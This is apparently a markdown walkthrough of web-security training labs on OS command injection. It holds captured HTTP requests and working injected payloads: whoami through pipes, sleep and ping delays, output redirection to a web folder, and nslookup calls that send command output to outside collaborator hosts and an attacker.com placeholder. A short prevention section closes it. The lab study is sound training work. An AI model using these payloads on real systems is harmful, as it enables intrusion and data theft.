# OS command injection


<details>
  <summary>Lab: OS command injection, simple case</summary>

> ###  This lab contains an OS command injection vulnerability in the product stock checker.The application executes a shell command containing user-supplied product and store IDs, and returns the raw output from the command in its response.

> To solve the lab, execute the ``whoami`` command to determine the name of the current user. 

---

```http
POST /product/stock HTTP/2
Host: 0ab600310469ed45802f12260076000d.web-security-academy.net
Cookie: session=7KilxApzO1M9KGCtQBlkx9sG5MambgGs
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0ab600310469ed45802f12260076000d.web-security-academy.net/product?productId=20
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://0ab600310469ed45802f12260076000d.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers



productId=20&storeId=1
```


```url
productId=20&storeId=1|whoami
productId=20&storeId=1;whoami
```

``output``

```css
peter-uTFecW
```



  
</details>











<details>
  <summary>Lab: Blind OS command injection with time delays</summary>

> ###  This lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response.

To solve the lab, exploit the blind OS command injection vulnerability to cause a ``10 second`` delay. 


---


```http
POST /feedback/submit HTTP/2
Host: 0aec0019044339aa8183eed900a700bb.web-security-academy.net
Cookie: session=UpWx4wsAbuhkNEr75meJinFiJae3vxOM
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 132
Origin: https://0aec0019044339aa8183eed900a700bb.web-security-academy.net
Referer: https://0aec0019044339aa8183eed900a700bb.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers



csrf=t9ieHjie7knvoadchmWRd7YqVAjtsoWX&name=hello&email=admin%40example.com&subject=hack&message=hello;
```




```bash
csrf=t9ieHjie7knvoadchmWRd7YqVAjtsoWX&name=hello&email=admin%40example.com||ping+-c+10+127.0.0.1||&subject=hack&message=hello;
csrf=t9ieHjie7knvoadchmWRd7YqVAjtsoWX&name=hello&email=admin%40example.com||sleep+10||&subject=hack&message=hello;
```







  
</details>





<details>
  <summary>Lab: Blind OS command injection with output redirection</summary>

> ###  This lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:``/var/www/images/``

> The application serves the images for the product catalog from this location. You can redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file.

> To solve the lab, execute the ``whoami`` command and retrieve the output. 



---

```
POST /feedback/submit HTTP/2
Host: 0ae3008f0323db578143254500a10043.web-security-academy.net
Cookie: session=7r1pMaXUqstxBss3DmNyzzo4jwQTsXF0
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 108
Origin: https://0ae3008f0323db578143254500a10043.web-security-academy.net
Referer: https://0ae3008f0323db578143254500a10043.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers



csrf=nM9nUcG8R4kScScJGBZNrQLLXGt5vm1U&name=a&email=example@admin.com&subject=c&message=d
```


```url
csrf=nM9nUcG8R4kScScJGBZNrQLLXGt5vm1U&name=a&email=||whoami>/var/www/images/output.txt||&subject=c&message=d
```


```url
https://0ae3008f0323db578143254500a10043.web-security-academy.net/image?filename=output.txt
```

``OUtput``

```
peter-p9zLde
```



  
</details>







<details>
  <summary>Lab: Blind OS command injection with out-of-band interaction</summary>

> ###  This lab contains a blind OS command injection vulnerability in the feedback function.The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

> To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator. 


---


```
csrf=nM9nUcG8R4kScScJGBZNrQLLXGt5vm1U&name=a&email=||nslookup crudrnshcmhythtyywai7uanxa8alegy6.oast.fun||&subject=c&message=d
```


```http
POST /feedback/submit HTTP/2
Host: 0a29003e046665bd800c3ff5002d00b7.web-security-academy.net
Cookie: session=FcuWQIKRQb5Q7A0SyFLymsB3m9BnssqE
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 128
Origin: https://0a29003e046665bd800c3ff5002d00b7.web-security-academy.net
Referer: https://0a29003e046665bd800c3ff5002d00b7.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers


csrf=hwEGtU6kixR7HQpa2LJ6TosadLEhzZQI&name=a&email=||nslookup 3nr9zc2d8zyrl5z1cjkw6lrtgkmba5yu.oastify.com||&subject=c&message=d
```

  
</details>






<details>
  <summary>Lab: Blind OS command injection with out-of-band data exfiltration</summary>


```bash
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```


```http
POST /feedback/submit HTTP/2
Host: 0a1a008a04dbfe72825bad31007200e8.web-security-academy.net
Cookie: session=AsET6SHMlw9nsqfhej24Fsmbl3XFaULl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
Origin: https://0a1a008a04dbfe72825bad31007200e8.web-security-academy.net
Referer: https://0a1a008a04dbfe72825bad31007200e8.web-security-academy.net/feedback
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers


csrf=0r5okHrEitjGNdhMDrIK7rKcZ0IkYkwt&name=a&email=||nslookup+`whoami`.irdo3r6sce26pk3ggyoba0v8kzqqeo2d.oastify.com||&subject=a&message=a
```



<img width="1607" height="646" alt="image" src="https://github.com/user-attachments/assets/1817543c-6423-4102-9931-9cbaefc77b78" />



  
</details>















---


## Ways of injecting OS commands

> You can use a number of shell metacharacters to perform OS command injection attacks.

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems: 

```bash

    &
    &&
    |
    ||

```



On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command: 


```bash
ping `whoami`.attacker.com
# أو
ping $(whoami).attacker.com

```



<details>
  <summary>How to prevent OS command injection attacks</summary>

> ### The most effective way to prevent OS command injection vulnerabilities is to never call out to OS commands from application-layer code.

> ### If you have to call out to OS commands with user-supplied input, then you must perform strong input validation. Some examples of effective validation include:  



   * Validating against a whitelist of permitted values.
   * Validating that the input is a number.
   * Validating that the input contains only alphanumeric characters, no other syntax or whitespace.


  
</details>








